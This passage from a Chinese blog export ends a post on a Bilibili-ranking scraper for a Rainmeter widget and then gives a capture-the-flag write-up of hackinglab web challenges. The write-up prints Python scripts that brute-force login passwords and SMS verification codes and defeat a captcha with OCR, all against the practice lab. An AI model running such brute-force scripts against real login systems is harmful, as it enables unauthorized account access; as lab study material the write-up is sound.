<li>getmessage.py 这个是一个简单的python爬虫，爬取bilibili的top100信息(所以电脑上要有python3环境，还要有requests和re模块)，代码如下:<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	network = os.system(<span class="string">'ping -n 1 www.bilibili.com &gt; nul'</span>)</span><br><span class="line">	<span class="keyword">if</span> network:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">url = <span class="string">'https://www.bilibili.com/ranking'</span>	<span class="comment"># B站top100网址</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url).content.decode(<span class="string">'utf-8'</span>)	<span class="comment"># get请求网址用变量r接收</span></span><br><span class="line">rule = <span class="string">r'&lt;div class="info"&gt;&lt;a href="https://www.bilibili.com/video/(.*?)" target="_blank" class="title"&gt;(.*?)&lt;/a&gt;&lt;!----&gt;&lt;div class="detail"&gt;'</span></span><br><span class="line">text = re.findall(rule, r)	<span class="comment"># 正则表达式获取到r中所有视频的所有信息用变量text接收</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'ListOfQuotes.txt'</span>, <span class="string">'w+'</span>) <span class="keyword">as</span> f:	<span class="comment"># 清空文件</span></span><br><span class="line">	f.write(<span class="string">''</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):	<span class="comment"># 遍历text</span></span><br><span class="line">	videourl = <span class="string">'https://www.bilibili.com/video/'</span> + text[i][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">	message = text[i][<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">if</span> len(message) &gt; <span class="number">20</span>:	<span class="comment"># 控制下title的长度，这里控制在20个字符，如果超过，用......代替</span></span><br><span class="line">		message = message[:<span class="number">20</span>] + <span class="string">'......'</span></span><br><span class="line">	print(str(i+<span class="number">1</span>) + <span class="string">' '</span> + videourl + <span class="string">' '</span> + message)</span><br><span class="line">	<span class="keyword">with</span> open(<span class="string">'ListOfQuotes.txt'</span>, <span class="string">'a'</span>, encoding=<span class="string">'gb18030'</span>) <span class="keyword">as</span> f:</span><br><span class="line">		<span class="comment"># 写入文件，一定要注意编码，因为有些up主会用到特殊符号，gbk编码会出问题！utf-8编码会令quotes读取成乱码！！</span></span><br><span class="line">		<span class="comment"># gb18030编码是gbk子集，会将特殊符号显示为??而且quotes显示正常！！</span></span><br><span class="line">		f.write(<span class="string">'&lt;quote&gt;['</span> + str(i+<span class="number">1</span>) + <span class="string">']'</span> + message + <span class="string">'\n'</span>)</span><br><span class="line">		f.write(<span class="string">'&lt;author&gt;'</span> + videourl + <span class="string">'\n'</span>)</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>将run.vbs添加到开启启动里即可实现开机自动获取</p>
<p>然后quotes调用的lua脚本如下</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Initialize</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">   CURRENTPATH = SKIN:GetVariable(<span class="string">'CURRENTPATH'</span>)</span><br><span class="line">   Quotes = &#123;&#125;</span><br><span class="line">   Authors = &#123;&#125;</span><br><span class="line">   i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">io</span>.<span class="built_in">lines</span>(CURRENTPATH..<span class="string">'ListOfQuotes.txt'</span>) <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">string</span>.<span class="built_in">sub</span>(line, <span class="number">1</span>, <span class="number">7</span>) == <span class="string">'&lt;quote&gt;'</span> <span class="keyword">then</span></span><br><span class="line">         i = i + <span class="number">1</span></span><br><span class="line">         Quotes[i] = <span class="built_in">string</span>.<span class="built_in">sub</span>(line, <span class="number">8</span>)</span><br><span class="line">      <span class="keyword">elseif</span> <span class="built_in">string</span>.<span class="built_in">sub</span>(line, <span class="number">1</span>, <span class="number">8</span>) == <span class="string">'&lt;author&gt;'</span> <span class="keyword">then</span></span><br><span class="line">         Authors[i] = <span class="built_in">string</span>.<span class="built_in">sub</span>(line, <span class="number">9</span>)</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         Quotes[i] = Quotes[i]..<span class="string">'#CRLF#'</span>..line</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">end</span> <span class="comment">--&gt;Initialize</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Update</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line">   rand = <span class="built_in">math</span>.<span class="built_in">random</span>(<span class="number">1</span>, #Quotes)</span><br><span class="line">   SKIN:Bang(<span class="string">'!SetOption'</span>, <span class="string">'MeterQuote'</span>, <span class="string">'Text'</span>, Quotes[rand])</span><br><span class="line">   SKIN:Bang(<span class="string">'!SetOption'</span>, <span class="string">'MeterAuthor'</span>, <span class="string">'Text'</span>, Authors[rand])</span><br><span class="line">   <span class="keyword">local</span> f = <span class="built_in">assert</span>(<span class="built_in">io</span>.<span class="built_in">open</span>(CURRENTPATH..<span class="string">'openurl.bat'</span>,<span class="string">'w+'</span>))</span><br><span class="line">   f:<span class="built_in">write</span>(<span class="string">'start '</span>, Authors[rand])</span><br><span class="line">   f:<span class="built_in">close</span>()</span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Quote number: '</span>..rand</span><br><span class="line">   </span><br><span class="line"><span class="keyword">end</span> <span class="comment">--&gt;Update</span></span><br></pre></td></tr></table></figure>

<h1 id="运行流程"><a href="#运行流程" class="headerlink" title="运行流程"></a>运行流程</h1><ul>
<li>run.vbs调用init.bat，init.bat执行编译getmessage.py脚本；</li>
<li>双击桌面quotes拉起main.vbs，main.vbs调用openurl.bat</li>
<li>刷新quotes时会执行quotes的lua脚本，随机从ListOfQuotes.txt文件中读取一条信息，并将视频地址写入到openurl.bat中</li>
</ul>
]]></content>
      <categories>
        <category>spider</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Rainmeter</tag>
        <tag>lua</tag>
        <tag>spider</tag>
      </tags>
  </entry>
  <entry>
    <title>WP-hackinglab 脚本关(py脚本)</title>
    <url>/2019/02/18/Writeup/WP-hackinglab-%E8%84%9A%E6%9C%AC%E5%85%B3%EF%BC%88py%E8%84%9A%E6%9C%AC%EF%BC%89/</url>
    <content><![CDATA[<h1 id="key又又找不到了"><a href="#key又又找不到了" class="headerlink" title="key又又找不到了"></a><a href="http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php" title="key又又找不到了" target="_blank" rel="noopener">key又又找不到了</a></h1><p>点击<code>_到这里找key__</code>后跳转到了没有key的页面，明显的跳转<br><img src="https://i.imgur.com/seRPINp.png" alt><br>抓下来<code>./search_key.php</code>这个页面就好</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">"http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php"</span></span><br><span class="line">r = ssion.post(url).content.decode('utf-8')</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/hfeLhcN.png" alt></p>
<h1 id="快速口算"><a href="#快速口算" class="headerlink" title="快速口算"></a><a href="http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php" title="快速口算" target="_blank" rel="noopener">快速口算</a></h1><p>明显的脚本题，直接抓下来然后计算式子就好<br>用到了正则</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line">r = ssion.post(url,headers=head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">findtext = re.findall(<span class="string">'&lt;br/&gt;\s+(.*?)='</span>, r)</span><br><span class="line"><span class="keyword">data</span> = &#123;<span class="string">'v'</span>: eval(findtext[<span class="number">0</span>])&#125;</span><br><span class="line">print(ssion.post(url, <span class="keyword">data</span>=<span class="keyword">data</span>, headers=head).content.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/oZpegAg.png" alt></p>
<h1 id="这个题目是空的"><a href="#这个题目是空的" class="headerlink" title="这个题目是空的"></a>这个题目是空的</h1><p>回答空即可，那就是<code>null</code></p>
<h1 id="怎么就是不弹出key呢？"><a href="#怎么就是不弹出key呢？" class="headerlink" title="怎么就是不弹出key呢？"></a><a href="http://lab1.xseclab.com/xss3_5dcdde90bbe55087eb3514405972b1a6/index.php" title="怎么就是不弹出key呢？" target="_blank" rel="noopener">怎么就是不弹出key呢？</a></h1><p>源码如下:</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">            function alert(a)&#123;</span><br><span class="line">                <span class="keyword">return</span> false;</span><br><span class="line">            &#125;</span><br><span class="line">            document.write=function()&#123;</span><br><span class="line">                <span class="keyword">return</span> false;</span><br><span class="line">            &#125;</span><br><span class="line">            function prompt(a)&#123;</span><br><span class="line">                <span class="keyword">return</span> false;</span><br><span class="line">            &#125;</span><br><span class="line">            var a=function ()&#123;</span><br><span class="line">               var b=function(p,a,c,k,e,r)&#123;e=function(c)&#123;<span class="keyword">return</span>(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;<span class="number">35</span>?String.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!''.<span class="built_in">replace</span>(/^/,String))&#123;while(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[function(e)&#123;<span class="keyword">return</span> r[e]&#125;];e=function()&#123;<span class="keyword">return</span>'\\w+'&#125;;c=<span class="number">1</span>&#125;;while(c--)<span class="keyword">if</span>(k[c])p=p.<span class="built_in">replace</span>(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);<span class="keyword">return</span> p&#125;('<span class="number">1</span>s(<span class="number">1</span>e(p,a,c,k,e,r)&#123;e=<span class="number">1</span>e(c)&#123;<span class="number">1</span>d(c&lt;a?\'\':e(<span class="number">1</span>p(c/a)))+((c=c%a)&gt;<span class="number">1</span>q?<span class="number">1</span>f<span class="number">.1</span>j(c+<span class="number">1</span>k):c<span class="number">.1</span>n(<span class="number">1</span>o))&#125;;<span class="number">1</span>g(!\'\'<span class="number">.1</span>h(/^/,<span class="number">1</span>f))&#123;<span class="number">1</span>i(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[<span class="number">1</span>e(e)&#123;<span class="number">1</span>d r[e]&#125;];e=<span class="number">1</span>e()&#123;<span class="number">1</span>d\'\\\\w+\'&#125;;c=<span class="number">1</span>&#125;;<span class="number">1</span>i(c--)<span class="number">1</span>g(k[c])p=p<span class="number">.1</span>h(<span class="number">1</span>l <span class="number">1</span>m(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);<span class="number">1</span>d p&#125;(\'Y(R(p,a,c,k,e,r)&#123;e=R(c)&#123;S(c&lt;a?\\\'\\\':e(<span class="number">18</span>(c/a)))+((c=c%a)&gt;<span class="number">17</span>?T<span class="number">.16</span>(c+<span class="number">15</span>):c<span class="number">.12</span>(<span class="number">13</span>))&#125;;U(!\\\'\\\'.V(/^/,T))&#123;W(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[R(e)&#123;S r[e]&#125;];e=R()&#123;S\\\'\\\\\\\\w+\\\'&#125;;c=<span class="number">1</span>&#125;;W(c--)U(k[c])p=p.V(Z <span class="number">11</span>(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);S p&#125;(\\\'G(B(p,a,c,k,e,r)&#123;e=B(c)&#123;A c.L(a)&#125;;E(!\\\\\\\'\\\\\\\'.C(/^/,F))&#123;D(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[B(e)&#123;A r[e]&#125;];e=B()&#123;A\\\\\\\'\\\\\\\\\\\\\\\\w+\\\\\\\'&#125;;c=<span class="number">1</span>&#125;;D(c--)E(k[c])p=p.C(I J(\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\'+e(c)+\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\',\\\\\\\'g\\\\\\\'),k[c]);A p&#125;(\\\\\\\'t(h(p,a,c,k,e,r)&#123;e=o;n(!\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\'.m(/^/,o))&#123;l(c--)r[c]=k[c]|<span class="type">|c</span>;k=[h(e)&#123;f r[e]&#125;];e=h()&#123;f\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\'&#125;;c=<span class="number">1</span>&#125;;l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\\'),k[c]);f p&#125;(\\\\\\\\\\\\\\\'<span class="number">1</span> <span class="number">3</span>=<span class="string">"6"</span>;<span class="number">1</span> <span class="number">4</span>=<span class="string">"7"</span>;<span class="number">1</span> <span class="number">5</span>=<span class="string">""</span>;<span class="number">8</span>(<span class="number">1</span> <span class="number">2</span>=<span class="number">0</span>;<span class="number">2</span>&lt;<span class="number">9</span>;<span class="number">2</span>++)&#123;<span class="number">5</span>+=<span class="number">3</span>+<span class="number">4</span>&#125;\\\\\\\\\\\\\\\',j,j,\\\\\\\\\\\\\\\'|<span class="type">u</span>|<span class="type">i</span>|<span class="type">b</span>|<span class="type">c</span>|<span class="type">d</span>|<span class="type">v</span>|<span class="type">x</span>|<span class="type">y</span>|<span class="type">j</span>\\\\\\\\\\\\\\\'.z(\\\\\\\\\\\\\\\'|<span class="type">\\\\\\\\\\\\\\\'),0</span>,&#123;&#125;))\\\\\\\',H,H,\\\\\\\'|<span class="type">||||||||||||||A</span>|<span class="type">|B</span>|<span class="type">|M</span>|<span class="type">|D</span>|<span class="type">C</span>|<span class="type">E</span>|<span class="type">F</span>|<span class="type">|I</span>|<span class="type">|J</span>|<span class="type">G</span>|<span class="type">N</span>|<span class="type">O</span>|<span class="type">|P</span>|<span class="type">Q</span>|<span class="type">K</span>\\\\\\\'.K(\\\\\\\'|<span class="type">\\\\\\\'),0</span>,&#123;&#125;))\\\',X,X,\\\'|<span class="type">|||||||||||||||||||||||||||||||||||S</span>|<span class="type">R</span>|<span class="type">V</span>|<span class="type">W</span>|<span class="type">U</span>|<span class="type">T</span>|<span class="type">Y</span>|<span class="type">13</span>|<span class="type">Z</span>|<span class="type">11</span>|<span class="type">14</span>|<span class="type">12</span>|<span class="type">10</span>|<span class="type">19</span>|<span class="type">1a</span>|<span class="type">1b</span>|<span class="type">1c</span>\\\'<span class="number">.14</span>(\\\'|<span class="type">\\\'),0</span>,&#123;&#125;))\',<span class="number">1</span>t,<span class="number">1</span>u,\'|<span class="type">||||||||||||||||||||||||||||||||||||||||||||||||||||1e</span>|<span class="type">1d</span>|<span class="type">1f</span>|<span class="type">1g</span>|<span class="type">1h</span>|<span class="type">1i</span>|<span class="type">1v</span>|<span class="type">1s</span>|<span class="type">1l</span>|<span class="type">|1m</span>|<span class="type">1n</span>|<span class="type">1o</span>|<span class="type">1r</span>|<span class="type">1k</span>|<span class="type">1j</span>|<span class="type">1q</span>|<span class="type">1p</span>|<span class="type">1w</span>|<span class="type">1x</span>|<span class="type">1y</span>|<span class="type">1z</span>\'<span class="number">.1</span>r(\'|<span class="type">\'),0</span>,&#123;&#125;))',<span class="number">62</span>,<span class="number">98</span>,'|<span class="type">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return</span>|<span class="type">function</span>|<span class="type">String</span>|<span class="type">if</span>|<span class="type">replace</span>|<span class="type">while</span>|<span class="type">fromCharCode</span>|<span class="type">29</span>|<span class="type">new</span>|<span class="type">RegExp</span>|<span class="type">toString</span>|<span class="type">36</span>|<span class="type">parseInt</span>|<span class="type">35</span>|<span class="type">split</span>|<span class="type">eval</span>|<span class="type">62</span>|<span class="type">75</span>|<span class="type">53</span>|<span class="type">var</span>|<span class="type">slakfj</span>|<span class="type">teslkjsdflk</span>|<span class="type">for</span>'.<span class="built_in">split</span>('|<span class="type">'),0</span>,&#123;&#125;);</span><br><span class="line">               var d=eval(b);</span><br><span class="line">               alert(<span class="string">"key is first 14 chars"</span>+d);</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">        &lt;a href=<span class="string">"javascript:a();"</span>&gt;<span class="keyword">_</span>点击之后怎么没反应呢？说好的弹窗呢？__&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>把这几个函数去掉本地上运行下即可</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alert</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prompt</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="逗比验证码第一期"><a href="#逗比验证码第一期" class="headerlink" title="逗比验证码第一期"></a><a href="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php" title="逗比验证码第一期" target="_blank" rel="noopener">逗比验证码第一期</a></h1><p>脚本爆破密码(这里验证码有无都可):</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"><span class="built_in">count</span> = <span class="number">0</span></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">"http://lab1.xseclab.com//vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php"</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=cd1c5f7554400cd3978f48d6e5c44c6a'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num in <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">    <span class="built_in">count</span> += <span class="number">1</span></span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: num, <span class="string">'vcode'</span>: <span class="string">''</span>, <span class="string">'submit'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data = data, headers = head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'pwd error'</span> in r:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"[%d]\033[1;31mpwd: error %d\033[0m"</span> % (<span class="built_in">count</span>, num))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'vcode error'</span> in r:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'[%d]\033[1;31mvcode error pwd:%d\033[0m'</span> % (<span class="built_in">count</span>, num))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> not in r:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'[%d]\033[1;32mpassword is: %d\033[0m'</span> % (<span class="built_in">count</span>, num))</span><br><span class="line">        <span class="keyword">print</span>(r)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/Ca8FJdz.png" alt></p>
<h1 id="逗比验证码第二期"><a href="#逗比验证码第二期" class="headerlink" title="逗比验证码第二期"></a><a href="http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php" title="逗比验证码第二期" target="_blank" rel="noopener">逗比验证码第二期</a></h1><p>一样的脚本爆破(这里不要填验证码):</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: num, <span class="string">'vcode'</span>: <span class="string">''</span>, <span class="string">'submit'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data=data, headers=head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m'</span> % num, end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\n\033[1;32m[+]Find password! %d\033[0m'</span> % num)</span><br><span class="line">        print(<span class="string">'\033[1;36m'</span>, r, <span class="string">'\033[0m'</span>)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/xoJ8bo1.png" alt></p>
<h1 id="逗比的验证码第三期-SESSION"><a href="#逗比的验证码第三期-SESSION" class="headerlink" title="逗比的验证码第三期(SESSION)"></a><a href="http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php" title="逗比的验证码第三期(SESSION)" target="_blank" rel="noopener">逗比的验证码第三期(SESSION)</a></h1><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: num, <span class="string">'vcode'</span>: <span class="string">''</span>, <span class="string">'submit'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data=data, headers=head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m'</span> % num, end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\n\033[1;32m[+]Find password! %d\033[0m'</span> % num)</span><br><span class="line">        print(<span class="string">'\033[1;36m'</span>, r, <span class="string">'\033[0m'</span>)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/kZEqUM7.png" alt></p>
<h1 id="逗比的手机验证码"><a href="#逗比的手机验证码" class="headerlink" title="逗比的手机验证码"></a><a href="http://lab1.xseclab.com/vcode5_mobi_5773f3def9f77f439e058894cefc42a8/" title="逗比的手机验证码" target="_blank" rel="noopener">逗比的手机验证码</a></h1><p>获取验证码后提交，发现需要以13388886667提交，<br>那么:获取验证码，提交，bp抓到，改手机号，提交即可</p>
<h1 id="基情燃烧的岁月"><a href="#基情燃烧的岁月" class="headerlink" title="基情燃烧的岁月"></a><a href="http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/" title="基情燃烧的岁月" target="_blank" rel="noopener">基情燃烧的岁月</a></h1><p>先爆破验证码:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'13388886666'</span>, <span class="string">'vcode'</span>: num, <span class="string">'Login'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data=data, headers=head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m'</span> % num, end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\n\033[1;32m[+]Find vcode! %d\033[0m'</span> % num)</span><br><span class="line">        print(<span class="string">'\033[1;36m'</span>, r, <span class="string">'\033[0m'</span>)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/WCRcYrG.png" alt><br>换手机号13399999999继续爆破:<br><img src="https://i.imgur.com/j74pYVA.png" alt></p>
<h1 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a><a href="http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php" title="验证码识别" target="_blank" rel="noopener">验证码识别</a></h1><p>查看源码以及提示中可以看到，验证码是三位数100-999<br>查看源码，分析js脚本可得知，每次提交需要点击获取验证码<br>脚本如下:</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php'</span></span><br><span class="line">urlmobi = <span class="string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/mobi_vcode.php'</span></span><br><span class="line">imageurl = <span class="string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="built_in">in</span> range(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = s.post(urlmobi, <span class="keyword">data</span>=&#123;<span class="string">'getcode'</span>: <span class="string">'1'</span>, <span class="string">'mobi'</span>: <span class="string">'13388886666'</span>&#125;)</span><br><span class="line">    r = s.get(imageurl)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'1.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="built_in">in</span> r.iter_content(chunk_size=<span class="number">1024</span>):</span><br><span class="line">            <span class="keyword">if</span> i:</span><br><span class="line">                f.write(i)</span><br><span class="line">    <span class="keyword">text</span> = pytesseract.image_to_string(<span class="string">'1.png'</span>).replace(<span class="string">' '</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">data</span> = &#123;<span class="string">'username'</span>: <span class="string">'13388886666'</span>, <span class="string">'mobi_code'</span>: num, <span class="string">'user_code'</span>: <span class="keyword">text</span>, <span class="string">'Login'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    result = s.post(url, <span class="keyword">data</span>=<span class="keyword">data</span>).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    print(num, <span class="keyword">text</span>, result)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> <span class="built_in">not</span> <span class="built_in">in</span> result:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<p>pytesseract识别验证码会有误差，多试几次即可<br>也可使用tesserocr</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>py脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>Git基本命令</title>
